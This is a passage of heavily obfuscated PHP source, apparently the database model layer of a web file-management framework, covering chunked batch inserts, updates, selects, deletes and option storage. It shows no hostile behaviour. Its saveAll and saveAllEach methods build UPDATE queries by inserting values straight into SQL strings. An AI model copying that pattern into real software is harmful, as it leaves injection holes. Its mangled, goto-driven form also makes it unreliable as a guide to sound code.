metaGet($F„…”’È¢ ) { goto DÑï’£µŞ; dÚ¢ªÊ„Ã: $CÒÔò°ŒÆÚ = array_to_keyvalue($CÒÔò°ŒÆÚ, $B‹åîù‚ëİ[89], $B‹åîù‚ëİ[356]); return $CÒÔò°ŒÆÚ; goto c¯‚È¾Á÷¸; D³›©‚Â…‘: $Aè¤š‚©– = Model($this->tableMeta[$B‹åîù‚ëİ[354]]); $eˆÍºÆ¼·é = array($Dâ„×ÒÉ => $F„…”’È¢ ); $CÒÔò°ŒÆÚ = $Aè¤š‚©–->field($B‹åîù‚ëİ[357])->where($eˆÍºÆ¼·é)->select(); goto dÚ¢ªÊ„Ã; DÑï’£µŞ: $B‹åîù‚ëİ =& $_SERVER[¢à]; if (!$this->tableMeta) { return array(); } $Dâ„×ÒÉ = $this->tableMeta[$B‹åîù‚ëİ[353]]; goto D³›©‚Â…‘; c¯‚È¾Á÷¸: } private function checkDataAutoHas($cŠÇ”ùäÅ¨) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $fÁ¬öŠĞÙÑ) { if (in_array($cŠÇ”ùäÅ¨, explode($_SERVER[¢à][47], $fÁ¬öŠĞÙÑ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$aëÛ—ç›•, $DÖ†ÔÌ¾Ô) { $F‚Î„–©„™ =& $_SERVER[¢à]; foreach ($this->dataAuto as $CÓ¿ëò’¥‡) { $D¦Ô¬ì«Í¿ = $CÓ¿ëò’¥‡[0]; if (!in_array($DÖ†ÔÌ¾Ô, explode($F‚Î„–©„™[47], $CÓ¿ëò’¥‡[2]))) { continue; } switch (trim($CÓ¿ëò’¥‡[3])) { case $F‚Î„–©„™[306]: case $F‚Î„–©„™[307]: $f‹ŒºÍÆ×Å = $CÓ¿ëò’¥‡[1]; $FÃ¥³¢¾š = isset($CÓ¿ëò’¥‡[4]) ? (array) $CÓ¿ëò’¥‡[4] : array(); if ($f‹ŒºÍÆ×Å == $F‚Î„–©„™[187] && array_key_exists($D¦Ô¬ì«Í¿, $aëÛ—ç›•)) { if (!$aëÛ—ç›•[$D¦Ô¬ì«Í¿]) { unset($aëÛ—ç›•[$D¦Ô¬ì«Í¿]); } break; } if (isset($aëÛ—ç›•[$D¦Ô¬ì«Í¿])) { array_unshift($FÃ¥³¢¾š, $aëÛ—ç›•[$D¦Ô¬ì«Í¿]); } if ($F‚Î„–©„™[306] == $CÓ¿ëò’¥‡[3]) { $aëÛ—ç›•[$D¦Ô¬ì«Í¿] = call_user_func_array($f‹ŒºÍÆ×Å, $FÃ¥³¢¾š); } else { $aëÛ—ç›•[$D¦Ô¬ì«Í¿] = call_user_func_array(array(&$this, $f‹ŒºÍÆ×Å), $FÃ¥³¢¾š); } break; case $F‚Î„–©„™[258]: $aëÛ—ç›•[$D¦Ô¬ì«Í¿] = $aëÛ—ç›•[$CÓ¿ëò’¥‡[1]]; break; case $F‚Î„–©„™[279]: if (isset($aëÛ—ç›•[$D¦Ô¬ì«Í¿]) && !is_string($aëÛ—ç›•[$D¦Ô¬ì«Í¿])) { $aëÛ—ç›•[$D¦Ô¬ì«Í¿] = json_encode_force($aëÛ—ç›•[$D¦Ô¬ì«Í¿]); } break; case $F‚Î„–©„™[308]: if ($aëÛ—ç›•[$D¦Ô¬ì«Í¿] === $F‚Î„–©„™[33]) { unset($aëÛ—ç›•[$D¦Ô¬ì«Í¿]); } break; case $F‚Î„–©„™[309]: $aëÛ—ç›•[$D¦Ô¬ì«Í¿] = $CÓ¿ëò’¥‡[1]; default: break; } } if ($DÖ†ÔÌ¾Ô == $F‚Î„–©„™[341]) { $c©³·ŒØ¢´ = strtolower($this->db->getDbType()); if (strpos($c©³·ŒØ¢´, $F‚Î„–©„™[9]) !== 0) { return; } $F£Úã ø˜â = $this->field(!0)->fields; $BçæÅÇ¬ˆÄ = $F£Úã ø˜â[$F‚Î„–©„™[237]]; if (isset($F£Úã ø˜â[$F‚Î„–©„™[236]])) { unset($BçæÅÇ¬ˆÄ[$F£Úã ø˜â[$F‚Î„–©„™[236]]]); } foreach ($BçæÅÇ¬ˆÄ as $DÎ‚¾õ¿Şä => $DÖ†ÔÌ¾Ô) { if (!isset($aëÛ—ç›•[$DÎ‚¾õ¿Şä])) { $aëÛ—ç›•[$DÎ‚¾õ¿Şä] = $F‚Î„–©„™[33]; } } } } private function dataAfterFilter(&$Bò°§É‹÷´) { $C–ôÅá½½ã =& $_SERVER[¢à]; foreach ($this->dataAuto as $EïÙÈ·òƒ¬) { $bæ¬ÒÅç«î = $EïÙÈ·òƒ¬[0]; if (!in_array($C–ôÅá½½ã[343], explode($C–ôÅá½½ã[47], $EïÙÈ·òƒ¬[2]))) { continue; } if (!isset($Bò°§É‹÷´[$bæ¬ÒÅç«î])) { continue; } switch (trim($EïÙÈ·òƒ¬[3])) { case $C–ôÅá½½ã[306]: case $C–ôÅá½½ã[307]: $D…ì«ÜÙ¼÷ = isset($EïÙÈ·òƒ¬[4]) ? (array) $EïÙÈ·òƒ¬[4] : array(); array_unshift($D…ì«ÜÙ¼÷, $Bò°§É‹÷´[$bæ¬ÒÅç«î]); if ($C–ôÅá½½ã[306] == $EïÙÈ·òƒ¬[3]) { $Bò°§É‹÷´[$bæ¬ÒÅç«î] = call_user_func_array($EïÙÈ·òƒ¬[1], $D…ì«ÜÙ¼÷); } else { $Bò°§É‹÷´[$bæ¬ÒÅç«î] = call_user_func_array(array(&$this, $EïÙÈ·òƒ¬[1]), $D…ì«ÜÙ¼÷); } break; case $C–ôÅá½½ã[258]: $Bò°§É‹÷´[$bæ¬ÒÅç«î] = $Bò°§É‹÷´[$EïÙÈ·òƒ¬[1]]; break; case $C–ôÅá½½ã[279]: $FØÖ¡—Ò„‚ = $Bò°§É‹÷´[$bæ¬ÒÅç«î]; $Bò°§É‹÷´[$bæ¬ÒÅç«î] = json_decode($FØÖ¡—Ò„‚, !0); if (is_null($Bò°§É‹÷´[$bæ¬ÒÅç«î])) { $Bò°§É‹÷´[$bæ¬ÒÅç«î] = $FØÖ¡—Ò„‚; } break; case $C–ôÅá½½ã[308]: if ($Bò°§É‹÷´[$bæ¬ÒÅç«î] === $C–ôÅá½½ã[33]) { unset($Bò°§É‹÷´[$bæ¬ÒÅç«î]); } break; case $C–ôÅá½½ã[309]: $Bò°§É‹÷´[$bæ¬ÒÅç«î] = $EïÙÈ·òƒ¬[1]; default: break; } } } public function saveAll($AÖ‡Æ½ĞÃ) { goto aÓ³µä»Ø; aÓ³µä»Ø: $Eªâˆ£‘ä =& $_SERVER[¢à]; $Dê¹°ø¨İò = $this->tablePrefix . $this->tableName; $EØ¿Ûá…Œã = self::SQL_WHERE_IN_CHUNK; goto EôĞÁŠ“®Ä; CÌëîÀ¼´¤: $EÛ‡Ğ„Î×‘ = array(); $BÍ«ö è±ô = count($AÖ‡Æ½ĞÃ); for ($DÏâ›±Ë¨Ğ = 0; $DÏâ›±Ë¨Ğ < $BÍ«ö è±ô; $DÏâ›±Ë¨Ğ++) { $fæÊÂÊÈâ = $AÖ‡Æ½ĞÃ[$DÏâ›±Ë¨Ğ]; if (!is_array($fæÊÂÊÈâ) || count($fæÊÂÊÈâ) != 4) { continue; } $f——¬ÒßŠÊ = "\x55\x50\x44\101\x54\105\40{$Dê¹°ø¨İò}\40\123\x45\x54\x20{$fæÊÂÊÈâ[2]}\40\x3d\x20\103\101\123\105\40{$fæÊÂÊÈâ[0]}\x20\12"; if ($fÔß‘£Œ–¡ == 0) { $B”ÂÃ×›ì³ = $f——¬ÒßŠÊ; } $EÛ‡Ğ„Î×‘[] = $Eªâˆ£‘ä[113] . $fæÊÂÊÈâ[1] . $Eªâˆ£‘ä[113]; $fÔß‘£Œ–¡++; $B”ÂÃ×›ì³ .= "\40\127\110\x45\x4e\x20\47{$fæÊÂÊÈâ[1]}\47\40\x54\x48\x45\x4e\40\47{$fæÊÂÊÈâ[3]}\47\x20\xa"; if ($fÔß‘£Œ–¡ == $EØ¿Ûá…Œã || $DÏâ›±Ë¨Ğ == $BÍ«ö è±ô - 1) { goto båİåº®…Æ; e«ğª©“: $fÔß‘£Œ–¡ = 0; $B”ÂÃ×›ì³ = $f——¬ÒßŠÊ; $this->chunkEventCheck(count($EÛ‡Ğ„Î×‘)); goto Aõ‡Ğñ¿ô¯; Aõ‡Ğñ¿ô¯: $EÛ‡Ğ„Î×‘ = array(); goto e™½¼®ã Ü; båİåº®…Æ: $f†ØÄ¦ = implode($Eªâˆ£‘ä[47], $EÛ‡Ğ„Î×‘); $B”ÂÃ×›ì³ .= "\x20\105\x4e\x44\x20\x20\x57\110\105\x52\x45\x20{$fæÊÂÊÈâ[0]}\40\x49\116\40\50{$f†ØÄ¦}\x29\40"; $this->execute($B”ÂÃ×›ì³); goto e«ğª©“; e™½¼®ã Ü: } } goto B‹‘îõğÓ§; EôĞÁŠ“®Ä: $AÖ‡Æ½ĞÃ = is_array($AÖ‡Æ½ĞÃ) ? $AÖ‡Æ½ĞÃ : array(); $B”ÂÃ×›ì³ = $Eªâˆ£‘ä[358]; $fÔß‘£Œ–¡ = 0; goto CÌëîÀ¼´¤; B‹‘îõğÓ§: $this->chunkEventSet(); goto BÈ‘õ¥ÒŸ; BÈ‘õ¥ÒŸ: } public function saveAllEach($d¿ˆ´Ñéçõ) { $fÀøÕ¯æ“Ä =& $_SERVER[¢à]; $d»˜´ô—» = $this->tablePrefix . $this->tableName; foreach ($d¿ˆ´Ñéçõ as $d±šÇŒò») { if (!is_array($d±šÇŒò») || count($d±šÇŒò») != 4) { continue; } $dÈ‡¸óé¦¨ = $d±šÇŒò»[0] . $fÀøÕ¯æ“Ä[359] . $d±šÇŒò»[1] . $fÀøÕ¯æ“Ä[113]; $d·„¡¨µ‹‡ = $d±šÇŒò»[2] . $fÀøÕ¯æ“Ä[359] . $d±šÇŒò»[3] . $fÀøÕ¯æ“Ä[113]; $C†±¯¬¶Ÿ = "\165\160\144\141\x74\x65\40{$d»˜´ô—»}\40\x73\x65\164\x20{$d·„¡¨µ‹‡}\x20\x77\x68\x65\162\x65\x20{$dÈ‡¸óé¦¨}\x3b"; $this->execute($C†±¯¬¶Ÿ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($b™†Œ„ù ù = false, $A’·”Ã©ø = false) { $this->_chunkEvent = $b™†Œ„ù ù; $this->_chunkEventParam = $A’·”Ã©ø; } private function chunkEventCheck($c¸ˆƒ‡³¯ì) { if (!$this->_chunkEvent) { return; } $bè¦ÉÖ¨¶Ü = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bè¦ÉÖ¨¶Ü[$_SERVER[¢à][360]] = $c¸ˆƒ‡³¯ì; Hook::trigger($this->_chunkEvent, $bè¦ÉÖ¨¶Ü); } public function addAll($cêÂÕí˜², $dâ…ÊÔ·˜ç = array(), $dˆó‡Àøè­ = false) { goto EƒÅôÌ‘³Ù; EƒÅôÌ‘³Ù: $A™ÎË » =& $_SERVER[¢à]; ignore_timeout(); $EÁÀ¨Ö²Ê = self::SQL_WHERE_IN_CHUNK; goto e–¢›‰Ã¢‡; B¾í®¡»ö: if (method_exists($this->db, $A™ÎË »[257])) { for ($Eç±ÈŞŒ³… = 0; $Eç±ÈŞŒ³… < count($cêÂÕí˜²); $Eç±ÈŞŒ³… += $EÁÀ¨Ö²Ê) { $B¡˜â’ª®ğ = array_slice($cêÂÕí˜², $Eç±ÈŞŒ³…, $EÁÀ¨Ö²Ê); if (!is_array($B¡˜â’ª®ğ) || count($B¡˜â’ª®ğ) == 0) { break; } $bêÍõñâ—Â = $this->db->insertAll($B¡˜â’ª®ğ, $dâ…ÊÔ·˜ç, $dˆó‡Àøè­); $this->chunkEventCheck(count($B¡˜â’ª®ğ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($cêÂÕí˜² as $DÍ©¡¤ğ„ => $dÛâß£×é–) { $bêÍõñâ—Â = $this->db->insert($dÛâß£×é–, $dâ…ÊÔ·˜ç, $dˆó‡Àøè­); } $this->commit(); } if (!1 !== $bêÍõñâ—Â) { $Bƒµ÷¶ = $this->getLastInsID(); if ($Bƒµ÷¶) { return $Bƒµ÷¶; } } return $bêÍõñâ—Â; goto EŒƒ”øï; e–¢›‰Ã¢‡: if (empty($cêÂÕí˜²)) { $this->error = think_lang($A™ÎË »[256]); return !1; } $dâ…ÊÔ·˜ç = $this->_parseOptions($dâ…ÊÔ·˜ç); foreach ($cêÂÕí˜² as $DÍ©¡¤ğ„ => $dÛâß£×é–) { $cêÂÕí˜²[$DÍ©¡¤ğ„] = $this->_facade($dÛâß£×é–); $this->_beforeInsert($cêÂÕí˜²[$DÍ©¡¤ğ„], $dâ…ÊÔ·˜ç); } goto B¾í®¡»ö; EŒƒ”øï: } public function save($d«ê¸£¢ßŠ = '', $EÓª»¢È´ˆ = array()) { goto Fšë‚Å›É; DÆ®˜ Ñ„³: $EœµÖßğº£ = $FËäóİ‚[$F‹¤‹Ä ×[260]][$e‹Şˆ‚ª¾][1]; $EœµÖßğº£ = is_array($EœµÖßğº£) ? $EœµÖßğº£ : array(); $b‘ÒÔÜ®â = count($EœµÖßğº£); goto EÙµÇ­ƒÛ÷; EÙµÇ­ƒÛ÷: for ($c…È…Îì¯† = 0; $c…È…Îì¯† < $b‘ÒÔÜ®â; $c…È…Îì¯† += $CÀåÆš¤˜ê) { $BŒîéØ«Ü = array_slice($EœµÖßğº£, $c…È…Îì¯†, $CÀåÆš¤˜ê); if (!is_array($BŒîéØ«Ü) || count($BŒîéØ«Ü) == 0) { break; } $FËäóİ‚[$F‹¤‹Ä ×[260]][$e‹Şˆ‚ª¾][1] = $BŒîéØ«Ü; $this->optionsValue($FËäóİ‚); $B¨Õªâ¬ğ¦ += parent::save($d«ê¸£¢ßŠ, $EÓª»¢È´ˆ); $this->chunkEventCheck(count($BŒîéØ«Ü)); } $this->chunkEventSet(); return $B¨Õªâ¬ğ¦; goto b•¬²¾¾£¨; Fšë‚Å›É: $F‹¤‹Ä × =& $_SERVER[¢à]; $CÀåÆš¤˜ê = self::SQL_WHERE_IN_CHUNK; $FËäóİ‚ = $this->optionsValue(); goto bù‹ÕÈá…; bù‹ÕÈá…: $e‹Şˆ‚ª¾ = $this->findWhereField($FËäóİ‚); if (!$e‹Şˆ‚ª¾) { return parent::save($d«ê¸£¢ßŠ, $EÓª»¢È´ˆ); } $B¨Õªâ¬ğ¦ = 0; goto DÆ®˜ Ñ„³; b•¬²¾¾£¨: } public function add($c×Â“Ú‡¡ = '', $F¬äîƒ’âŒ = array(), $CÓÃ„Ğ»ğ˜ = false) { if ($this->addTaskStatus && is_array($c×Â“Ú‡¡)) { $this->addTaskData[] = $c×Â“Ú‡¡; return; } return parent::add($c×Â“Ú‡¡, $F¬äîƒ’âŒ, $CÓÃ„Ğ»ğ˜); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cŒŒ‡Õåºã = array()) { goto CŒˆÚ…ïÉº; F™¥“‹³: return $C¡Îì™ùˆâ; goto f‹¶Ñæ–; B‚ãºÃêè·: $A‚¤íòàÏµ = $this->findWhereField($EôâŞ°©ÊÉ); if (!$A‚¤íòàÏµ || isset($EôâŞ°©ÊÉ[$F®Ûµ‰–…[277]]) || isset($EôâŞ°©ÊÉ[$F®Ûµ‰–…[337]])) { return parent::select($cŒŒ‡Õåºã); } $CãŒâ¡³­Š = $EôâŞ°©ÊÉ[$F®Ûµ‰–…[260]][$A‚¤íòàÏµ][1]; goto c´Ãøğéô¡; CŒˆÚ…ïÉº: $F®Ûµ‰–… =& $_SERVER[¢à]; $d™À¥©© = self::SQL_WHERE_IN_CHUNK; $EôâŞ°©ÊÉ = $this->optionsValue(); goto B‚ãºÃêè·; c´Ãøğéô¡: $CãŒâ¡³­Š = is_array($CãŒâ¡³­Š) ? $CãŒâ¡³­Š : array(); $C¡Îì™ùˆâ = null; for ($A¯ëî‘Ó‚¿ = 0; $A¯ëî‘Ó‚¿ < count($CãŒâ¡³­Š); $A¯ëî‘Ó‚¿ += $d™À¥©©) { $EÚ¬¢Í¤Ş¡ = array_slice($CãŒâ¡³­Š, $A¯ëî‘Ó‚¿, $d™À¥©©); if (!is_array($EÚ¬¢Í¤Ş¡) || count($EÚ¬¢Í¤Ş¡) == 0) { break; } $EôâŞ°©ÊÉ[$F®Ûµ‰–…[260]][$A‚¤íòàÏµ][1] = $EÚ¬¢Í¤Ş¡; $this->optionsValue($EôâŞ°©ÊÉ); $C©æñ½íËØ = parent::select($cŒŒ‡Õåºã); if (!$C©æñ½íËØ) { continue; } if (is_null($C¡Îì™ùˆâ)) { $C¡Îì™ùˆâ = array(); } $C¡Îì™ùˆâ = array_merge($C¡Îì™ùˆâ, $C©æñ½íËØ); } goto F™¥“‹³; f‹¶Ñæ–: } public function delete($d‡«¡ø×È« = array()) { goto aÈÜëŞĞâ–; aÈÜëŞĞâ–: $D¦¥Üæ…³ñ =& $_SERVER[¢à]; $bĞ¹—ÚÉ± = self::SQL_WHERE_IN_CHUNK; $dÒŸØ÷Û˜ = $this->optionsValue(); goto aŸ´ªÁéóƒ; c×’˜â¶Ö: return $E›¥Ö‚; goto fÊïö…ìÔô; aŸ´ªÁéóƒ: $eÉ¹‘ÕªÓê = $this->findWhereField($dÒŸØ÷Û˜); if (!$eÉ¹‘ÕªÓê) { return parent::delete($d‡«¡ø×È«); } $E›¥Ö‚ = 0; goto BÈÃ¶ñÑ¸Ï; BÈÃ¶ñÑ¸Ï: $b¢ÅÆ•Õ³â = $dÒŸØ÷Û˜[$D¦¥Üæ…³ñ[260]][$eÉ¹‘ÕªÓê][1]; $b¢ÅÆ•Õ³â = is_array($b¢ÅÆ•Õ³â) ? $b¢ÅÆ•Õ³â : array(); for ($a£Â—‹ô‹ƒ = 0; $a£Â—‹ô‹ƒ < count($b¢ÅÆ•Õ³â); $a£Â—‹ô‹ƒ += $bĞ¹—ÚÉ±) { $fãøÃÄ—ó = array_slice($b¢ÅÆ•Õ³â, $a£Â—‹ô‹ƒ, $bĞ¹—ÚÉ±); if (!is_array($fãøÃÄ—ó) || count($fãøÃÄ—ó) == 0) { break; } $dÒŸØ÷Û˜[$D¦¥Üæ…³ñ[260]][$eÉ¹‘ÕªÓê][1] = $fãøÃÄ—ó; $this->optionsValue($dÒŸØ÷Û˜); $E›¥Ö‚ += parent::delete($d‡«¡ø×È«); } goto c×’˜â¶Ö; fÊïö…ìÔô: } private function findWhereField($AÃ±¶ŞŒ¥î) { $B‚‚‰õÕëÒ =& $_SERVER[¢à]; $EÂ„¿ºåôÚ = self::SQL_WHERE_IN_CHUNK; if (!is_array($AÃ±¶ŞŒ¥î) || !is_array($AÃ±¶ŞŒ¥î[$B‚‚‰õÕëÒ[260]])) { return !1; } foreach ($AÃ±¶ŞŒ¥î[$B‚‚‰õÕëÒ[260]] as $e“õÒì¸¼¬ => $DË÷ßîÄ‘ó) { if (is_array($DË÷ßîÄ‘ó) && isset($DË÷ßîÄ‘ó[0]) && is_string($DË÷ßîÄ‘ó[0]) && strtolower($DË÷ßîÄ‘ó[0]) == $B‚‚‰õÕëÒ[7] && is_array($DË÷ßîÄ‘ó[1]) && count($DË÷ßîÄ‘ó[1]) > $EÂ„¿ºåôÚ) { ignore_timeout(); return $e“õÒì¸¼¬; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\155\117\x70\164\151\157\x6e"; public $field = array(); public function listData($C÷Ù´Ñ‘‘Å = false, $fƒÉèÊ‹ = "\x6d\157\x64\x69\146\171\124\151\155\145", $dîç¿ƒÏ‰œ = false) { $déâ¡©ë „ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$déâ¡©ë „) { return $C÷Ù´Ñ‘‘Å ? null : array(); } if (!$C÷Ù´Ñ‘‘Å) { $déâ¡©ë „ = array_filter(array_values($déâ¡©ë „)); return array_sort_by($déâ¡©ë „, $fƒÉèÊ‹, $dîç¿ƒÏ‰œ); } return $déâ¡©ë „[$_SERVER[¢à][361] . $C÷Ù´Ñ‘‘Å]; } public function insert($c”ÜºˆÊˆ¼) { goto B¢È¥‚Ä¯; B¢È¥‚Ä¯: $fĞŸØ¼¢ƒ =& $_SERVER[¢à]; $c”ÜºˆÊˆ¼ = array_field_key($c”ÜºˆÊˆ¼, $this->field); $b¸Û¬£ï‰¿ = Model($this->modelType)->get($fĞŸØ¼¢ƒ[362], $this->optionType . $fĞŸØ¼¢ƒ[363]); goto cÁ¹Õ÷‰´¾; cÛ¦‚¡¼ğÓ: return $b¸Û¬£ï‰¿; goto dğö œœÅÜ; DÔ¤Üí·ˆ©: $c”ÜºˆÊˆ¼[$fĞŸØ¼¢ƒ[107]] = time(); Model($this->modelType)->set($fĞŸØ¼¢ƒ[362], $b¸Û¬£ï‰¿, $this->optionType . $fĞŸØ¼¢ƒ[363]); Model($this->modelType)->set($fĞŸØ¼¢ƒ[361] . $b¸Û¬£ï‰¿, $c”ÜºˆÊˆ¼, $this->optionType); goto cÛ¦‚¡¼ğÓ; cÁ¹Õ÷‰´¾: $b¸Û¬£ï‰¿ = $b¸Û¬£ï‰¿ ? $b¸Û¬£ï‰¿ : 0; $c”ÜºˆÊˆ¼[$fĞŸØ¼¢ƒ[364]] = ++$b¸Û¬£ï‰¿; $c”ÜºˆÊˆ¼[$fĞŸØ¼¢ƒ[184]] = time(); goto DÔ¤Üí·ˆ©; dğö œœÅÜ: } public function update($D¬“®…óã÷, $DËš°ì‚ñ¶) { goto dÜ´µ¬ù˜§; dÀ½Øä©: if (!$EëÄñåİë¤) { return !1; } $DËš°ì‚ñ¶ = array_merge($EëÄñåİë¤, $DËš°ì‚ñ¶); $DËš°ì‚ñ¶[$FëŞ‡Î’Š’[107]] = time(); goto fë–Œ”ªñÙ; fë–Œ”ªñÙ: return Model($this->modelType)->set($FëŞ‡Î’Š’[361] . $D¬“®…óã÷, $DËš°ì‚ñ¶, $this->optionType); goto Aëƒ·Ã¢Şõ; dÜ´µ¬ù˜§: $FëŞ‡Î’Š’ =& $_SERVER[¢à]; $DËš°ì‚ñ¶ = array_field_key($DËš°ì‚ñ¶, $this->field); $EëÄñåİë¤ = $this->listData($D¬“®…óã÷); goto dÀ½Øä©; Aëƒ·Ã¢Şõ: } public function remove($a‡·ŒÄŸÂ) { return Model($this->modelType)->remove($_SERVER[¢à][361] . $a‡·ŒÄŸÂ, $this->optionType); } public function clear() { $E‹ğŠĞ¼‰Â =& $_SERVER[¢à]; Model($this->modelType)->remove($E‹ğŠĞ¼‰Â[362], $this->optionType . $E‹ğŠĞ¼‰Â[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Eğ‘Ğ‚×«, $BÊ–ĞÑ¥Ùö) { if (!$BÊ–ĞÑ¥Ùö) { return !1; } $d‰¹––îÎˆ = $this->listData(); $d‰¹––îÎˆ = array_to_keyvalue($d‰¹––îÎˆ, $Eğ‘Ğ‚×«); return isset($d‰¹––îÎˆ[$BÊ–ĞÑ¥Ùö]) ? $d‰¹––îÎˆ[$BÊ–ĞÑ¥Ùö] : !1; } public function findByName($D¦ ³ÙÃĞ¯) { return $this->findByKey($_SERVER[¢à][28], $D¦ ³ÙÃĞ¯); } protected function resetData($F£Å›ÆŒÃÊ) { $CŠœÇÏÁ‘ =& $_SERVER[¢à]; $F£Å›ÆŒÃÊ = is_array($F£Å›ÆŒÃÊ) ? $F£Å›ÆŒÃÊ : array(); $e®µ¥èÖ = array(); for ($F÷Ìßƒ„ší = 0; $F÷Ìßƒ„ší < count($F£Å›ÆŒÃÊ); $F÷Ìßƒ„ší++) { $e®µ¥èÖ[$CŠœÇÏÁ‘[361] . $F£Å›ÆŒÃÊ[$F÷Ìßƒ„ší][$CŠœÇÏÁ‘[364]]] = $F£Å›ÆŒÃÊ[$F÷Ìßƒ„ší]; } return Model($this->modelType)->set($e®µ¥èÖ, !1, $this->optionType); } private function getAutoName($d¤¬Ï¼èÛ) { $aóù›Ó˜ˆ = array_to_keyvalue($this->listData(), $_SERVER[¢à][28]); if (!$aóù›Ó˜ˆ || !isset($aóù›Ó˜ˆ[$d¤¬Ï¼èÛ])) { return $d¤¬Ï¼èÛ; } for ($F­õ‘¼Ûøœ = 1; $F­õ‘¼Ûøœ < count($aóù›Ó˜ˆ); $F­õ‘¼Ûøœ++) { $B‚ŒÀÃõ = $d¤¬Ï¼èÛ . "\50{$F­õ‘¼Ûøœ}\51"; if (!isset($aóù›Ó˜ˆ[$B‚ŒÀÃõ])) { return $B‚ŒÀÃõ; } } return $B‚ŒÀÃõ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($C‚“ƒ÷ğ‘à = false, $eßÔ·è¨¤ = '', $fŠéÆ‘™Â¬ = false) { goto D÷¥’«Ô; B…Á¨‘í­ê: $E§ â«— = is_array($E§ â«—) ? $E§ â«— : array(); if (is_array($F²´³¹„á¨)) { $F²´³¹„á¨ = array_merge($E§ â«—, $F²´³¹„á¨); return $C‚“ƒ÷ğ‘à ? isset($F²´³¹„á¨[$C‚“ƒ÷ğ‘à]) ? $F²´³¹„á¨[$C‚“ƒ÷ğ‘à] : null : $F²´³¹„á¨; } $dïŞˆ‘­Õ  = $this->filterWhere(array($aŒ²‘çªæœ[29] => $eßÔ·è¨¤)); goto eµÌŠ÷êƒÌ; D”…Îœé‡ê: $this->cacheSet($eßÔ·è¨¤, $F²´³¹„á¨); $F²´³¹„á¨ = array_merge($E§ â«—, $F²´³¹„á¨); return $C‚“ƒ÷ğ‘à ? $F²´³¹„á¨[$C‚“ƒ÷ğ‘à] : $F²´³¹„á¨; goto BÎ¯ÌÂë; D÷¥’«Ô: $aŒ²‘çªæœ =& $_SERVER[¢à]; $F²´³¹„á¨ = $this->cacheGet($eßÔ·è¨¤); $E§ â«— = $this->optionDefault($eßÔ·è¨¤); goto B…Á¨‘í­ê; eµÌŠ÷êƒÌ: $F²´³¹„á¨ = $this->where($dïŞˆ‘­Õ )->select(); $F²´³¹„á¨ = array_to_keyvalue($F²´³¹„á¨, $aŒ²‘çªæœ[89], $aŒ²‘çªæœ[356]); foreach ($F²´³¹„á¨ as $BªÄ¤Ş£±® => $cöô©ùÙÒ) { if ($fŠéÆ‘™Â¬ || in_array($BªÄ¤Ş£±®, $this->jsonField)) { $F²´³¹„á¨[$BªÄ¤Ş£±®] = json_decode($cöô©ùÙÒ, !0); } } goto D”…Îœé‡ê; BÎ¯ÌÂë: } public function set($e³ºÕ¿’¡, $FĞãòÈßÌ = false, $F‘†Ş¢›Ú° = '') { goto AÚ÷†Â†À¤; fÌÀ°¦¸¨Û: foreach ($BéçòºÉß± as $A‹ƒÚÃìä¾ => $dïªŠ“ƒâÌ) { goto e¦ßˆ’Í†ô; e¦ßˆ’Í†ô: if (isset($d¯§ÒÄŞĞ«[$A‹ƒÚÃìä¾]) && $d¯§ÒÄŞĞ«[$A‹ƒÚÃìä¾] === $dïªŠ“ƒâÌ) { continue; } $d¯§ÒÄŞĞ«[$A‹ƒÚÃìä¾] = $dïªŠ“ƒâÌ; if (is_array($dïªŠ“ƒâÌ)) { $dïªŠ“ƒâÌ = json_encode_force($dïªŠ“ƒâÌ); } goto B…ÅÑƒÎªí; aÎ„‡¾¸‡½: $dóÓòˆ²ß[] = $this->filterWhere($BéçòºÉß±); goto DêÏÀƒ×ÕÚ; B…ÅÑƒÎªí: $this->checkLength($dïªŠ“ƒâÌ, !1, $this->tableName . $D© …Â‡ŒÖ[4] . $e³ºÕ¿’¡); $dïªŠ“ƒâÌ = self::textEncode($dïªŠ“ƒâÌ); $BéçòºÉß± = array($D© …Â‡ŒÖ[29] => $F‘†Ş¢›Ú°, $D© …Â‡ŒÖ[89] => $A‹ƒÚÃìä¾, $D© …Â‡ŒÖ[356] => $dïªŠ“ƒâÌ); goto aÎ„‡¾¸‡½; DêÏÀƒ×ÕÚ: } if (!$dóÓòˆ²ß) { return !0; } if ($AÙéÒÛÅµ) { $this->cacheSet($F‘†Ş¢›Ú°, $d¯§ÒÄŞĞ«); } goto EìÍ¤ìÂÕ; EìÍ¤ìÂÕ: return $this->addAll($dóÓòˆ²ß, array(), !0); goto CÎ¾èåù¿; AÚ÷†Â†À¤: $D© …Â‡ŒÖ =& $_SERVER[¢à]; $d¯§ÒÄŞĞ« = $this->cacheGet($F‘†Ş¢›Ú°); $d¯§ÒÄŞĞ« = is_array($d¯§ÒÄŞĞ«) ? $d¯§ÒÄŞĞ« : array(); goto BëòË©Ç¹ã; BëòË©Ç¹ã: $AÙéÒÛÅµ = $d¯§ÒÄŞĞ« ? !0 : !1; $dóÓòˆ²ß = array(); $BéçòºÉß± = is_array($e³ºÕ¿’¡) ? $e³ºÕ¿’¡ : array($e³ºÕ¿’¡ => $FĞãòÈßÌ); goto fÌÀ°¦¸¨Û; CÎ¾èåù¿: } protected function optionDefault($eÑˆ÷Ó‚Ò = '') { return !1; } public function setDeep($cÎÎ’‹Ğ§Æ, $cĞŸ®ÌÈœ» = false, $e²ğÛÕ®“ = '') { $B²Ä´²«Ê = explode($_SERVER[¢à][93], $cÎÎ’‹Ğ§Æ); $Cä¬£Ôç„¶ = $this->get(); array_set_value($Cä¬£Ôç„¶, $cÎÎ’‹Ğ§Æ, $cĞŸ®ÌÈœ»); $this->set($B²Ä´²«Ê[0], $Cä¬£Ôç„¶[$B²Ä´²«Ê[0]], $e²ğÛÕ®“); } public function remove($f‘®èã»¿, 